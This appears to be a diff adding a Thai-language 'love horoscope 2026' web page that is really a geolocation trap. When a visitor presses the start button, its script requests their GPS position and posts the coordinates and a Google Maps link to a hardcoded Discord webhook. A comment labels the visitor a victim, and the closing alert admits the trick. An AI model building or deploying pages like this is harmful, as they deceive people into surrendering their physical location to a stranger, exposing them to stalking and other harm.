@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <title>เช็คดวงความรักปี 2026</title>
+</head>
+<body style="text-align: center; font-family: sans-serif; margin-top: 50px;">
+    <h1>🔮 เว็บเช็คดวงความรักแม่นที่สุดในสามโลก</h1>
+    <p>กดปุ่มด้านล่างเพื่ออนุญาตให้ระบบสแกนดวงชะตาของคุณ</p>
+    <button onclick="getLocation()" style="padding: 10px 20px; font-size: 16px; cursor: pointer;">เริ่มเช็คดวง</button>
+
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendPosition, showError);
+            } else {
+                alert("เบราว์เซอร์ของคุณไม่รองรับการระบุตำแหน่ง");
+            }
+        }
+
+        function sendPosition(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            
+            // ลิงก์ Google Maps ของเหยื่อ
+            const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+            
+            // เอา Discord Webhook URL ของคุณมาใส่ตรงนี้
+            const webhookURL = "https://discord.com/api/webhooks/1556724430804353128/C0ycH8pJRbc_HPr3v59jk9l3SVNtvEZpdDgtpP2reeUFFqMr9OM2ko7Xqf16Xz9e3Mmb";
+
+            const payload = {
+                content: `🚨 มีคนหลงเข้าเว็บมาแล้ว!\n📍 พิกัด GPS: ${mapsUrl}\n🌐 ละติจูด: ${lat}, ลองจิจูด: ${lon}`
+            };
+
+            fetch(webhookURL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            }).then(() => {
+                alert("วิเคราะห์ดวงสำเร็จ! (แต่จริงๆ โดนแกล้งแล้ว 555)");
+            });
+        }
+
+        function showError(error) {
+            alert("อ้าว! ทำไมไม่ยอมกดอนุญาตตำแหน่งล่ะ ลองกดใหม่อมดิ 555");
+        }
+    </script>
+</body>
+</html>
